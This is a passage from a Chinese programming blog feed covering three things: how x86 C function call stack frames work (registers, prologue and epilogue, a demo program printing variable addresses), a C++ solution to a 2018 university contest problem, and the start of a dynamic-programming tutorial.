title="3 栈帧结构"></a>3 栈帧结构</h3><p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p><p>编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p><p>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p><p>为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。</p><p>函数调用栈的典型内存布局如下图所示：<center><br><img src="/blog/images/271644419475745.jpg" alt="图2 函数调用栈的典型内存布局"><br></center></p><p>图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。  此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。</p><p>从图中可以看出，函数调用时入栈顺序为</p><p><code>实参N~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1~N</code></p><p>其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p><p>EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p><p>若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示：<center><br><img src="/blog/images/271650059007975.jpg" alt="图3 函数调用栈的可能内存布局"><br></center></p><p>在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。</p><p>以下代码用于函数栈布局示例：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//StackFrame.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> Strt&#123;</div><div class="line">    <span class="keyword">int</span> member1;</div><div class="line">    <span class="keyword">int</span> member2;</div><div class="line">    <span class="keyword">int</span> member3;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ADDR(x)     printf(<span class="meta-string">"&amp;"</span>#x<span class="meta-string">" = %p\n"</span>, &amp;x)</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackFrameContent</span><span class="params">(<span class="keyword">int</span> para1, <span class="keyword">int</span> para2, <span class="keyword">int</span> para3)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> locVar1 = <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> locVar2 = <span class="number">2</span>;</div><div class="line">    <span class="keyword">int</span> locVar3 = <span class="number">3</span>;</div><div class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>&#125;;</div><div class="line">    <span class="keyword">struct</span> Strt tStrt = &#123;<span class="number">0</span>&#125;;</div><div class="line">    PRINT_ADDR(para1); <span class="comment">//若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span></div><div class="line">    PRINT_ADDR(para2);</div><div class="line">    PRINT_ADDR(para3);</div><div class="line">    PRINT_ADDR(locVar1);</div><div class="line">    PRINT_ADDR(locVar2);</div><div class="line">    PRINT_ADDR(locVar3);</div><div class="line">    PRINT_ADDR(arr);</div><div class="line">    PRINT_ADDR(arr[<span class="number">0</span>]);</div><div class="line">    PRINT_ADDR(arr[<span class="number">1</span>]);</div><div class="line">    PRINT_ADDR(arr[<span class="number">2</span>]);</div><div class="line">    PRINT_ADDR(tStrt);</div><div class="line">    PRINT_ADDR(tStrt.member1);</div><div class="line">    PRINT_ADDR(tStrt.member2);</div><div class="line">    PRINT_ADDR(tStrt.member3);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> locMain1 = <span class="number">1</span>, locMain2 = <span class="number">2</span>, locMain3 = <span class="number">3</span>;</div><div class="line">    PRINT_ADDR(locMain1);</div><div class="line">    PRINT_ADDR(locMain2);</div><div class="line">    PRINT_ADDR(locMain3);</div><div class="line">    StackFrameContent(locMain1, locMain2, locMain3);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[locMain1,2,3] = [%d, %d, %d]\n"</span>, locMain1, locMain2, locMain3);</div><div class="line">    <span class="built_in">memset</span>(&amp;locMain2, <span class="number">0</span>, <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[locMain1,2,3] = [%d, %d, %d]\n"</span>, locMain1, locMain2, locMain3);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>编译链接并执行后，输出打印如下：<center><br><img src="/blog/images/271651489169470.jpg" alt="图4 StackFrame输出"><br></center></p><p>函数栈布局示例如下图所示。为直观起见，低于起始高地址0xbfc75a58的其他地址采用点记法，如0x.54表示0xbfc75a54，以此类推。<center><br><img src="/blog/images/271652449633815.jpg" alt="图5 StackFrame栈帧"><br></center></p><p>内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</p><p>函数调用以值传递时，传入的实参(locMain1~3)与被调函数内操作的形参(para1~3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。</p><p>此外，”[locMain1,2,3] = [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。</p><p>注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。</p><blockquote><p>【扩展阅读】函数局部变量布局方式</p><p>与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。</p><p>基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。</p></blockquote><h3 id="4-堆栈操作"><a href="#4-堆栈操作" class="headerlink" title="4 堆栈操作"></a>4 堆栈操作</h3><p>函数调用时的具体步骤如下：</p><ol><li><p>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。<br>注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</p></li><li><p>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</p></li><li><p>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</p></li><li><p>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</p></li><li><p>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</p></li><li><p>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p></li><li><p>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p></li><li><p>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p></li><li><p>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</p></li></ol><p>步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p><p>以下介绍函数调用过程中的主要指令。</p><p><strong>压栈(push)</strong>：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</p><p><strong>出栈(pop)</strong>：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。<center><br><img src="/blog/images/271656343069114.jpg" alt="图6 出栈入栈操作示意 "><br></center></p><p>可见，压栈操作将寄存器内容存入栈内存中(寄存器原内容不变)，栈顶地址减小；出栈操作从栈内存中取回寄存器内容(栈内已存数据不会自动清零)，栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。</p><p><strong>调用(call)</strong>：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。</p><p><strong>离开(leave)</strong>： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。</p><p><strong>返回(ret)</strong>：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</p><p>基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下：</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr style="background-color: #837d7c;"><br><td valign="top" width="83"><br><p align="center"><strong>&nbsp;</strong></p><br></td><br><td valign="top" width="130"><br><p align="center"><strong>指令序列</strong></p><br></td><br><td valign="top" width="465"><br><p align="center"><strong>含义</strong></p><br></td><br></tr><br><tr><br><td rowspan="4" width="83"><br><p>函数序</p><br><p>(prologue)</p><br></td><br><td width="130"><br><p>push %ebp</p><br></td><br><td valign="top" width="465"><br><p align="left">将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧</p><br></td><br></tr><br><tr><br><td width="130"><br><p>mov %esp, %ebp</p><br></td><br><td valign="top" width="465"><br><p align="left">将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶</p><br></td><br></tr><br><tr><br><td width="130"><br><p>sub &lt;n&gt;, %esp</p><br></td><br><td valign="top" width="465"><br><p align="left">将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。&lt;n&gt;为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术)</p><br></td><br></tr><br><tr><br><td width="130"><br><p>push &lt;r&gt;</p><br></td><br><td valign="top" width="465"><br><p align="left">可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值</p><br></td><br></tr><br><tr><br><td rowspan="4" width="83"><br><p>函数跋</p><br><p>(epilogue)</p><br></td><br><td width="130"><br><p>pop &lt;r&gt;</p><br></td><br><td valign="top" width="465"><br><p align="left">可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值</p><br></td><br></tr><br><tr><br><td width="130"><br><p>mov %ebp, %esp<span style="color: #ff0000;"><em></em></span></p><br></td><br><td valign="top" width="465"><br><p align="left">恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理)</p><br></td><br></tr><br><tr><br><td width="130"><br><p>pop %ebp<span style="color: #ff0000;"></span></p><br></td><br><td valign="top" width="465"><br><p align="left">主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处</p><br></td><br></tr><br><tr><br><td width="130"><br><p>ret</p><br></td><br><td valign="top" width="465"><br><p align="left">从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈</p><br></td><br></tr><br><tr><br><td colspan="3" width="678"><br><p align="left"><span style="color: #ff0000;">*</span>：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。</p><br></td><br></tr><br></tbody><br></table><p>若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。</p><p>参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td colspan="2" valign="top" width="614"><br><p>extern CdeclDemo(int w, int x, int y, intz);&nbsp; //调用CdeclDemo函数</p><br><p>CdeclDemo(1, 2, 3, 4);&nbsp; //调用CdeclDemo函数</p><br></td><br></tr><br><tr style="background-color: #857c7a;"><br><td valign="top" width="311"><br><p align="center"><strong>压栈方式一</strong></p><br></td><br><td valign="top" width="304"><br><p align="center"><strong>压栈方式二</strong></p><br></td><br></tr><br><tr><br><td valign="top" width="311"><br><p>pushl 4&nbsp; //压入参数z</p><br><p>pushl 3&nbsp; //压入参数y</p><br><p>pushl 2&nbsp; //压入参数x</p><br><p>pushl 1&nbsp; //压入参数w</p><br><p>call CdeclDemo &nbsp;//调用函数</p><br><p>addl $16, %esp&nbsp; //恢复ESP原值，使其指向调用前保存的返回地址</p><br></td><br><td valign="top" width="304"><br><p><em>subl&nbsp;&nbsp; $16, %esp</em> //多次调用仅执行一遍</p><br><p>movl&nbsp; $4, 12(%esp) //传送参数z至堆栈第四个位置</p><br><p>movl&nbsp; $3, 8(%esp) //传送参数y至堆栈第三个位置</p><br><p>movl&nbsp; $2, 4(%esp) //传送参数x至堆栈第二个位置</p><br><p>movl&nbsp; $1, (%esp) //传送参数w至堆栈栈顶</p><br><p>call CdeclDemo &nbsp;//调用函数</p><br></td><br></tr><br></tbody><br></table><p>两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。</p><p>某些情况下，编译器生成的函数调用进入/退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进/出指令序列以达到优化目的。</p><p>尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。</p><p>注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p><p><em>以上全文转载自：<a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">C语言函数调用栈(一)</a></em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即
      
    
    </summary>
    
    
      <category term="Basic" scheme="https://www.smlight.xyz/tags/Basic/"/>
    
      <category term="CTF" scheme="https://www.smlight.xyz/tags/CTF/"/>
    
      <category term="PWN" scheme="https://www.smlight.xyz/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2018广东工业大学校赛题解</title>
    <link href="https://www.smlight.xyz/2018/03/25/2018-gdut/"/>
    <id>https://www.smlight.xyz/2018/03/25/2018-gdut/</id>
    <published>2018-03-25T01:48:46.000Z</published>
    <updated>2018-04-14T12:52:39.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-平分游戏"><a href="#C-平分游戏" class="headerlink" title="C-平分游戏"></a><a href="https://www.nowcoder.com/acm/contest/90/C" target="_blank" rel="noopener">C-平分游戏</a></h3><p>先不考虑是隔$k$个人，直接当成每次逆时针加$k$。那么原图中的$n$个人划分为若干个环，每个环都是独立的，这里取一个四元环继续讲解。<br><img src="https://img-blog.csdn.net/20180325101139977" alt=""></p><p>假设四个人原先有的钱为$S_i$，逆时针收到的钱为$x_i$（负数即反向），需要达到平均值$A$，那么有<br>$$<br>\left\{<br>\begin{array}{c}<br>S_1+x_1-x_2=A \\<br>S_2+x_2-x_3=A \\<br>S_3+x_3-x_4=A \\<br>S_4+x_4-x_1=A<br>\end{array}<br>\right.<br>$$<br>一行一行加，解得：<br>$$<br>\left\{<br>\begin{array}{c}<br>x_1=&amp;x_1 &amp;\triangleq x_1-y_1 \\<br>x_2=&amp;x_1-(A-S_1) &amp;\triangleq x_1-y_2 \\<br>x_3=&amp;x_1-((A-S_1)+(A-S_2)) &amp;\triangleq x_1-y_3 \\<br>x_4=&amp;x_1-((A-S_1)+(A-S_2)+(A-S_3)) &amp;\triangleq x_1-y_4<br>\end{array}<br>\right.<br>$$<br>这个环所需要的总时间为$T=|x_1|+|x_2|$ $+|x_3|+|x_4|$ $=|x_1-y_1|+|x_1-y_2|$ $+|x_1-y_3|+|x_1-y_4|$，由绝对值数形结合的知识可知当$x_1$取$y_i$的中位数（不计平均）时该式最小。<br>对于这道题，可以先求出总的平均值$A$，然后每个环都用这个$A$列方程和验证，答案累加即可。<br>最后说一下$k$的问题，题意不是很清晰，最终确定隔$n-1$个人是可以的（相当于相邻），隔$n$个人是不可以的（没有实际意义）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1000010</span>;</div><div class="line">ll s[N];</div><div class="line"><span class="keyword">bool</span> vis[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,k;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;k);</div><div class="line">    ++k;</div><div class="line">    ll sum=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;s[i]);</div><div class="line">        sum+=s[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (sum%n) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"gg"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    ll A=sum/n,ans=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        cnt+=(s[i]==A);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (cnt==n) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"0"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (k&gt;n) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"gg"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">bool</span> good=<span class="literal">true</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (vis[i]) <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">int</span> j=i;</div><div class="line">        ll tmp=<span class="number">0</span>;</div><div class="line">        <span class="built_in">vector</span>&lt;ll&gt; ve;</div><div class="line">        <span class="keyword">do</span> &#123;</div><div class="line">            vis[j]=<span class="literal">true</span>;</div><div class="line">            tmp+=A-s[j];</div><div class="line">            ve.push_back(tmp);</div><div class="line">            j=(j+k)%n;</div><div class="line">        &#125; <span class="keyword">while</span> (j!=i);</div><div class="line">        <span class="keyword">if</span> (tmp) &#123;</div><div class="line">            good=<span class="literal">false</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        sort(begin(ve),end(ve));</div><div class="line">        ll x=ve[ve.size()/<span class="number">2</span>];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> y:ve) &#123;</div><div class="line">            ans+=<span class="built_in">abs</span>(x-y);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!good) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"gg"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-平分游戏&quot;&gt;&lt;a href=&quot;#C-平分游戏&quot; class=&quot;headerlink&quot; title=&quot;C-平分游戏&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.nowcoder.com/acm/contest/90/C&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>HHUACM 寒假专题 动态规划</title>
    <link href="https://www.smlight.xyz/2018/02/25/hhutraining3/"/>
    <id>https://www.smlight.xyz/2018/02/25/hhutraining3/</id>
    <published>2018-02-25T11:40:45.000Z</published>
    <updated>2018-02-26T05:58:25.785Z</updated>
    
    <content type="html"><![CDATA[<h3 id="F-数塔"><a href="#F-数塔" class="headerlink" title="F - 数塔"></a><a href="https://vjudge.net/problem/HDU-2084" target="_blank" rel="noopener">F - 数塔</a></h3><p>经典问题，数塔。<br>使用动态规划解决问题的（最重要）前提是：</p><ol><li>问题具有最优子结构</li><li>最优子结构的状态可以记录</li></ol><p><img src="http://acm.hdu.edu.cn/data/images/2084-1.jpg" alt=""><br>例如上图中，以第二层$12$为顶层的数塔就是一个最优子结构。<br>再回到原来的顶层，想得到最终的结果只需要知道第二层两个子结构能得到的最大和，这是可记录的。<br>所以，我们从底层往顶层进行动态规划就可以了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> a[<span class="number">111</span>][<span class="number">111</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span 